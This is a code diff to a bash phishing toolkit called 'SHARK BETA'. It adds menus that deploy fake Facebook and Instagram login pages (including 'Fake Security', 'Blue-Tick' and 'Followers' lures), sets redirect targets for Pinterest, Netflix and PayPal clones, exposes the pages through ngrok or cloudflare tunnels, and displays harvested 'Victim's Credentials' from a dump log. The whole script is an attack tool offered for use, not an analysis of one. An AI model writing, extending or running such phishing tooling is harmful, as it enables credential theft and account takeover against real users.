@@ -579,11 +579,14 @@ fi
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${logfile}.cloud.log");askuri;
 }
 function prt() {
-clear
-printf "${green}        ╔──────────────────────────────────────╗\n"
-printf "${green}        |   ${cyan1}     S.H.A.R.K !! B.E.T.A ${green}         |
-        |   ${yellow}      Choose your Option ${green}          |\n"
-printf "${green}        ╚──────────────────────────────────────╝${cyan1}.beta v$VERSION \n\n"
+clear         
+printf "
+${red}      ░██████╗██╗░░██╗░█████╗░██████╗░██╗░░██╗
+${nc}      ██╔════╝██║░░██║██╔══██╗██╔══██╗██║░██╔╝
+${yellow}      ╚█████╗░███████║███████║██████╔╝█████═╝░
+${green}      ░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░
+${blue}      ██████╔╝██║░░██║██║░░██║██║░░██║██║░╚██╗
+${purple}      ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝ ${yellow}.beta v${VERSION}\n\n"
 printf "${red}[A]$cafe :${green} ngrok $cafe\e[0;33m[\e[0;31mGoogle Alert!\e[0;33m]
 
 ${red}[B]$cafe :${green} cloudflare $cafe\e[0;33m[\e[0;32mNEW!\e[0;33m]
@@ -651,8 +654,8 @@ elif [[ $portfrd == "b" || $portfrd == "B" || $portfrd == "cloudflare" ]]; then
 elif [[ $portfrd == "D" || $portfrd == "d" || $portfrd == "localhost" ]];then
 	p="d"
 	redirc
-	main
 	old
+	main
 	credentials && ipinfo
 else
         echo
@@ -696,7 +699,7 @@ msg "Waiting for Victim's Credentials..."
 }
 function ipinfo() {
 	echo
-	if [[ -f ../.dumplog.txt ]]; then
+	if [[ -e ../.dumplog.txt ]]; then
 		CRD1=$(cat ../.dumplog.txt)
 		msg "Your Old Credentials :\n$CRD1\n"
 	fi
@@ -731,7 +734,7 @@ banner2() {
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
         ╚════════════════════════════════════╝
 	SHARK BETA : ${white}v${VERSION}${green}
-         Reborn by : ${white}Mr.Derek(t2g)${green}
+         Reborn by : ${white}Mr.Derek(E343IO)${green}
          Publisher : ${white}Bhavik Oza${green}
 	    Author : ${white}Ashish Singh${green}
 	     Note  : ${yellow}Soon will add New Features!${yellow}
@@ -899,7 +902,80 @@ else
 	echo
 fi
 }
+FC_OPT() {
+echo ""
+printf "${green}[${nc}01${green}]${yellow} Traditional Login Page\n\n"
+printf "${green}[${nc}02${green}]${yellow} Advanced Voting Poll Login Page\n\n"
+printf "${green}[${nc}03${green}]${yellow} Fake Security Login Page\n\n"
+printf "${green}[${nc}04${green}]${yellow} Facebook Messenger Login Page\n\n"
+read -p $'\e[1;32m[\e[0m-\e[1;32m]\e[1;33m Select an option : \e[1;36m' pgrep
+case $pgrep in 
+		1 | 01) 
+			cd ${phish}/facebook/
+			reddc="TRUE"
+			FILE="login.php"
+			oldy="https://facebook.com/"
+			decne;;
+		2 | 02)
+			cd ${phish}/fb_advanced/
+			decne;;
+		3 | 03)
+			cd ${phish}/fb_security/
+			reddc="TRUE"
+			FILE="login.php"
+			oldy="https://www.facebook.com/"
+			decne;;
+		4 | 04)
+			cd ${phish}/fb_messenger/
+			reddc="TRUE"
+			FILE="login.php"
+			oldy="https://www.facebook.com/"
+			decne;;
+		*)
+			error_msg " Invalid Option, Try Again..."
+			{ sleep 1; clear; FC_OPT; };;
+	esac
 
+}
+INSTA_OPT() {
+echo ""
+printf "${green}[${nc}01${green}]${yellow} Traditional Login Page\n\n"
+printf "${green}[${nc}02${green}]${yellow} 1000+ Followers Login Page\n\n"
+printf "${green}[${nc}03${green}]${yellow} Insta Blue-Tick Login Page\n\n"
+printf "${green}[${nc}04${green}]${yellow} Auto Followers Login Page\n\n"
+read -p $'\e[1;32m[\e[0m-\e[1;32m]\e[1;33m Select an option : \e[1;36m' pgrep
+case $pgrep in 
+		1 | 01) 
+			cd ${phish}/instagram/
+			NOTPF="login.php"
+			YOTPF="posts.php"
+			oldy="https://www.instagram.com"
+			decne;;
+		2 | 02)
+			cd ${phish}/insta_followers/
+			reddc="TRUE"
+			FILE="login.php"
+			oldy="https://www.instagram.com"
+			decne;;
+		3 | 03)
+			cd ${phish}/ig_verify/
+			mkdir drk/
+			cp -R * drk/
+			cd drk/
+			rm -rf drk/
+			decne;;
+		4 | 04)
+			cd ${phish}/ig_followers/
+			reddc="TRUE"
+			FILE="login.php"
+			oldy="https://google.com/"
+			decne;;
+		*)
+			error_msg " Invalid Option, Try Again..."
+			{ sleep 1; clear; INSTA_OPT; };;
+	esac
+
+}
 ########
 # DRIVER
 ########
@@ -917,10 +993,10 @@ do
        ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
         ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
        ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
-       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${cyan1} .beta v${VERSION} \n                                     ${yellow}Reborn by Mr.Derek(E343IO)\n\n "
+       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${cyan1}.beta v${VERSION} \n                                     ${yellow}Reborn by Mr.Derek(E343IO)\n\n "
 
       printf "${green}       ╔──────────────────────────────────────╗\n"
-      printf "${green}        |   ${cyan1}     B E T A   V E R S I O N ${green}      |\n"
+      printf "${green}        |   ${cyan1}B  E  T  A    V  E  R  S  I  O  N  ${green}|\n"
       printf "${green}        ╚──────────────────────────────────────╝\n\n"
 
      printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
@@ -947,20 +1023,15 @@ function banner(){
         banner
 
         if [ $option = 01 ] || [ $option = 1 ];then
-	        cd ${phish}/facebook/
-		reddc="TRUE"
-		FILE="login.php"
-		oldy="https://facebook.com/"
-		decne
+		FC_OPT
 	elif [ $option = 02 ] || [ $option = 2 ];then
                 cd $phish/pinterest/
+		reddc="TRUE"
+		FILE="post.php"
+		oldy="https://in.pinterest.com"
 		decne
 	elif [ $option = 03 ] || [ $option = 3 ];then
-		cd $phish/instagram/
-		NOTPF="login.php"
-		YOTPF="posts.php"
-		oldy="https://www.instagram.com"
-		decne
+		INSTA_OPT
 	elif [ $option = 04 ] || [ $option = 4 ];then
                 cd $phish/UberEats-Phishing/
 		NOTPF="posts.php"
@@ -1007,7 +1078,7 @@ function banner(){
         elif [ $option = 08 ] || [ $option = 8 ];then
                 cd $phish/Netflix/
 		NOTPF="post.php"
-		YTOPF="posts.php"
+		YOTPF="posts.php"
 		oldy="https://www.netflix.com/in"
                 decne
 	elif [ $option = 09 ] || [ $option = 9 ];then
@@ -1069,7 +1140,7 @@ function banner(){
 		decne
 	elif [ $option = 19 ];then
                 cd $phish/paypal/
-		valu="19"
+		#valu="19"
 		reddc="TRUE"
 		FILE="postss.php"
 		oldy="https://www.paypal.com"
